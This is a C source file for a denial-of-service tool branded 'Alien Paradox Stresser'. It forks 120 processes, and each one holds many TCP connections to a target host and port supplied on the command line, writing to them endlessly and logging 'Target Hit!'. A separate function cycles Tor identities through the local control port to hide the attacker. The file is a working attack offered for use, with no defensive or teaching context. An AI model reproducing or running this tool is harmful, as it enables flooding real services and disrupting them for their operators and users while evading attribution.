/*
MMP"""""""MM dP oo
M' .mmmm  MM 88
M         `M 88 dP .d8888b. 88d888b.
M  MMMMM  MM 88 88 88ooood8 88'  `88
M  MMMMM  MM 88 88 88.  ... 88    88
M  MMMMM  MM dP dP `88888P' dP    dP
MMMMMMMMMMMM

MM"""""""`YM                                  dP
MM  mmmmm  M                                  88
M'        .M .d8888b. 88d888b. .d8888b. .d888b88 .d8888b. dP.  .dP
MM  MMMMMMMM 88'  `88 88'  `88 88'  `88 88'  `88 88'  `88  `8bd8'
MM  MMMMMMMM 88.  .88 88       88.  .88 88.  .88 88.  .88  .d88b.
MM  MMMMMMMM `88888P8 dP       `88888P8 `88888P8 `88888P' dP'  `dP
MMMMMMMMMMMM

M""MMMMM""M          oo   dP
M  MMMMM  M               88
M  MMMMM  M 88d888b. dP d8888P
M  MMMMM  M 88'  `88 88   88
M  `MMM'  M 88    88 88   88
Mb       dM dP    dP dP   dP
MMMMMMMMMMM                   
*/

#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <stdint.h>
#include <unistd.h>
#include <netdb.h>
#include <signal.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <time.h>

int make_socket(char *host, char *port) {
	struct addrinfo hints, *servinfo, *p;
	int sock, r;

		{
			printf("Alien Paradox Stresser﻿\n");
		}

//	fprintf(stderr, "[Connecting -> %s:%s\n", host, port);
	memset(&hints, 0, sizeof(hints));
	hints.ai_family = AF_UNSPEC;
	hints.ai_socktype = SOCK_STREAM;
	if((r=getaddrinfo(host, port, &hints, &servinfo))!=0) {
		fprintf(stderr, "getaddrinfo: %s\n", gai_strerror(r));
		exit(0);
	}
	for(p = servinfo; p != NULL; p = p->ai_next) {
		if((sock = socket(p->ai_family, p->ai_socktype, p->ai_protocol)) == -1) {
			continue;
		}
		if(connect(sock, p->ai_addr, p->ai_addrlen)==-1) {
			close(sock);
			continue;
		}
		break;
	}
	if(p == NULL) {
		if(servinfo)
			freeaddrinfo(servinfo);
		fprintf(stderr, "No connection could be made\n");
		exit(0);
	}
	if(servinfo)
		freeaddrinfo(servinfo);
	fprintf(stderr, "[Connected -> %s:%s]\n", host, port);
	return sock;
}

void broke(int s) {
	// do nothing
}

#define CONNECTIONS 20
#define THREADS 120

void attack(char *host, char *port, int id) {
	int sockets[CONNECTIONS];
	int x, g=1, r;
	for(x=0; x!= CONNECTIONS; x++)
		sockets[x]=0;
	signal(SIGPIPE, &broke);
	while(1) {
		for(x=0; x != CONNECTIONS; x++) {
			if(sockets[x] == 0)
				sockets[x] = make_socket(host, port);
			r=write(sockets[x], "\0", 1);
			if(r == -1) {
				close(sockets[x]);
				sockets[x] = make_socket(host, port);
			} else
//				fprintf(stderr, "Socket[%i->%i] -> %i\n", x, sockets[x], r);
			fprintf(stderr, "[%i: Target Hit!]\n", id);
		}
		fprintf(stderr, "[%i: Target Hit!]\n", id);
		usleep(300000);
	}
}

void cycle_identity() {
	int r;
	int socket = make_socket("localhost", "9050");
	write(socket, "AUTHENTICATE \"\"\n", 16);
	while(1) {
		r=write(socket, "signal NEWNYM\n\x00", 16);
		fprintf(stderr, "[%i: cycle_identity -> signal NEWNYM\n", r);
		usleep(300000);
	}
}

int main(int argc, char **argv) {
	int x;
	if(argc !=3)
		cycle_identity();
	for(x=0; x != THREADS; x++) {
		if(fork())
			attack(argv[1], argv[2], x);
		usleep(200000);
	}
	getc(stdin);
	return 0;
}
